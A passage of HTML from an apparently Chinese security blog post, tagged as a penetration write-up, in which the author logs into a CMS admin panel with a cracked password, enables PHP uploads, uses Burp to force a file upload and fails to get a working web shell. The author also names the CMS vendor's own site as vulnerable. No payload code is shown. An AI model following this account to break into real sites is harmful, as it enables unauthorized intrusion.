+		data-flex-basis="537px"
+	
+></p>
+<p>Oh Fuck</p>
+<p>试了试另外一个，也是一样的结果…..</p>
+<p>​     <img src="/p/xaef7i9f/28.png"
+	width="599"
+	height="248"
+	srcset="/p/xaef7i9f/28_huedb54658d362c794f3a4ee01270f6b24_8076_480x0_resize_box_3.png 480w, /p/xaef7i9f/28_huedb54658d362c794f3a4ee01270f6b24_8076_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="241"
+		data-flex-basis="579px"
+	
+></p>
+<p>然后看了看其他网站，可能真的人品爆发，有个站解密成功了</p>
+<p>然后登录之。</p>
+<p>​     <img src="/p/xaef7i9f/29.png"
+	width="950"
+	height="675"
+	srcset="/p/xaef7i9f/29_hu63e04c63c2043010cbdbc9e6c6827dfe_283588_480x0_resize_box_3.png 480w, /p/xaef7i9f/29_hu63e04c63c2043010cbdbc9e6c6827dfe_283588_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="140"
+		data-flex-basis="337px"
+	
+></p>
+<p>大概看了看网站后台，在这添加上php</p>
+<p>​     <img src="/p/xaef7i9f/30.png"
+	width="1005"
+	height="70"
+	srcset="/p/xaef7i9f/30_huf14629e057386be5fe37c0ded4f2b406_5557_480x0_resize_box_3.png 480w, /p/xaef7i9f/30_huf14629e057386be5fe37c0ded4f2b406_5557_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1435"
+		data-flex-basis="3445px"
+	
+></p>
+<p>找到个上传文件的地方，感觉shell就在眼前</p>
+<p>​     <img src="/p/xaef7i9f/31.png"
+	width="491"
+	height="360"
+	srcset="/p/xaef7i9f/31_huc7bf231d3a7150f6d7ac37fd80053349_27187_480x0_resize_box_3.png 480w, /p/xaef7i9f/31_huc7bf231d3a7150f6d7ac37fd80053349_27187_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="136"
+		data-flex-basis="327px"
+	
+></p>
+<p>点击上传发现…………我真是个命苦的人啊</p>
+<p><img src="/p/xaef7i9f/32.png"
+	width="928"
+	height="369"
+	srcset="/p/xaef7i9f/32_hu24ee8d81e7f1af63c782ac0b04c5f6b4_51913_480x0_resize_box_3.png 480w, /p/xaef7i9f/32_hu24ee8d81e7f1af63c782ac0b04c5f6b4_51913_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="251"
+		data-flex-basis="603px"
+	
+></p>
+<p>只能拿出我苦练多年的打狗大法…….拿起burp抓包</p>
+<p><img src="/p/xaef7i9f/33.png"
+	width="545"
+	height="63"
+	srcset="/p/xaef7i9f/33_hubd3018f284e6ef90b0ca088ef0d0f5f4_5981_480x0_resize_box_3.png 480w, /p/xaef7i9f/33_hubd3018f284e6ef90b0ca088ef0d0f5f4_5981_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="865"
+		data-flex-basis="2076px"
+	
+></p>
+<p>在这里构造畸形的http，然后放包，成功上传。（自带滑稽表情）</p>
+<p><img src="/p/xaef7i9f/34.png"
+	width="478"
+	height="282"
+	srcset="/p/xaef7i9f/34_hu62dc3136957d8f43a2082b85ed8c9f41_4037_480x0_resize_box_3.png 480w, /p/xaef7i9f/34_hu62dc3136957d8f43a2082b85ed8c9f41_4037_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="169"
+		data-flex-basis="406px"
+	
+></p>
+<p><img src="/p/xaef7i9f/35.png"
+	width="155"
+	height="162"
+	srcset="/p/xaef7i9f/35_hua787be30e25ebb4d7b5288f025feb2f3_3788_480x0_resize_box_3.png 480w, /p/xaef7i9f/35_hua787be30e25ebb4d7b5288f025feb2f3_3788_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="95"
+		data-flex-basis="229px"
+	
+></p>
+<p>点击那个放大镜</p>
+<p><img src="/p/xaef7i9f/36.png"
+	width="680"
+	height="330"
+	srcset="/p/xaef7i9f/36_huf392f8c70d38b99d4c8cf003a09528a3_130491_480x0_resize_box_3.png 480w, /p/xaef7i9f/36_huf392f8c70d38b99d4c8cf003a09528a3_130491_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="206"
+		data-flex-basis="494px"
+	
+></p>
+<p>源码暴露了路径也不对劲…….看来不是他真实路径。</p>
+<p>又翻了翻，发现这个，点击检索</p>
+<p><img src="/p/xaef7i9f/37.png"
+	width="1090"
+	height="150"
+	srcset="/p/xaef7i9f/37_hu5c14b260f09b87e43f175ef7e1a35ed8_7251_480x0_resize_box_3.png 480w, /p/xaef7i9f/37_hu5c14b260f09b87e43f175ef7e1a35ed8_7251_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="726"
+		data-flex-basis="1744px"
+	
+></p>
+<p><img src="/p/xaef7i9f/38.png"
+	width="296"
+	height="139"
+	srcset="/p/xaef7i9f/38_hua1b89238148871cf548074b017dc3e0c_3329_480x0_resize_box_3.png 480w, /p/xaef7i9f/38_hua1b89238148871cf548074b017dc3e0c_3329_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="212"
+		data-flex-basis="511px"
+	
+></p>
+<p>看到刚才上传的文件，点击源文件</p>
+<p>路径变成了，多了个下划线…….</p>
+<p><a class="link" href="http://www.xxx.com/data/upload/2017-04/08215611_edit._php"  target="_blank" rel="noopener"
+    >http://www.xxx.com/data/upload/2017-04/08215611_edit._php</a></p>
+<p>这个问题卡了我两天，各种姿势都试了，还是没办法绕过。</p>
+<p>所以放弃了。。。。。</p>
+<p>Ps：这个提供这套cms的站点也存在该漏洞</p>
+<p><img src="/p/xaef7i9f/39.png"
+	width="1607"
+	height="703"
+	srcset="/p/xaef7i9f/39_hu035a9778f051d1329b0843da8601f031_309455_480x0_resize_box_3.png 480w, /p/xaef7i9f/39_hu035a9778f051d1329b0843da8601f031_309455_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="228"
+		data-flex-basis="548px"
+	
+></p>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/">渗透实战</a>
+        
+            <a href="/tags/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/">原创文章</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/ym1ku8fe/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/jx/wallhaven-jxdvpp.png" loading="lazy" data-key="ym1ku8fe" data-hash="https://w.wallhaven.cc/full/jx/wallhaven-jxdvpp.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">佛学的魔改.net Ueditor</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/iqi0ucr4/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/p9/wallhaven-p97q3p.jpg" loading="lazy" data-key="iqi0ucr4" data-hash="https://w.wallhaven.cc/full/p9/wallhaven-p97q3p.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">记一次任意文件上传</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/3dvjkhwx/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/vq/wallhaven-vqex23.jpg" loading="lazy" data-key="3dvjkhwx" data-hash="https://w.wallhaven.cc/full/vq/wallhaven-vqex23.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">记一个奇葩的上传点</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/mwcslpwe/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/2y/wallhaven-2y2g66.jpg" loading="lazy" data-key="mwcslpwe" data-hash="https://w.wallhaven.cc/full/2y/wallhaven-2y2g66.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">一个项目中遇到的奇葩站点</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/6gkds72h/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/l8/wallhaven-l8d8my.png" loading="lazy" data-key="6gkds72h" data-hash="https://w.wallhaven.cc/full/l8/wallhaven-l8d8my.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">毫无技术含量的一次渗透</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="https://utteranc.es/client.js" 
+        repo="360rce/blog-comment"
+        issue-term="pathname"
+        
+        label="utterances"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2023 本博客所有文章除特别声明外，均采用 CC BY-SA 4.0 协议 ，转载请注明出处！
+    </section>
+    <i class="powerby">
+    <span id="busuanzi_container_site_pv">
+        访问量&nbsp;-&nbsp;<span id="busuanzi_value_site_pv"></span>
+    </span>&nbsp;
+    <span id="busuanzi_container_site_uv">
+        访客数&nbsp;-&nbsp;<span id="busuanzi_value_site_uv"></span>人次
+      </span>
+    </i>
+
+
+</footer>
+<script>
+    (function(u, c) {
+      var d = document, t = 'script', o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function(e) { c(e); }); }
+      s.parentNode.insertBefore(o, s);
+    })('//cdn.bootcss.com/pangu/4.0.7/pangu.min.js', function() {
+      pangu.spacingPage();
+    });
+</script>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+
+    </body>
+</html>
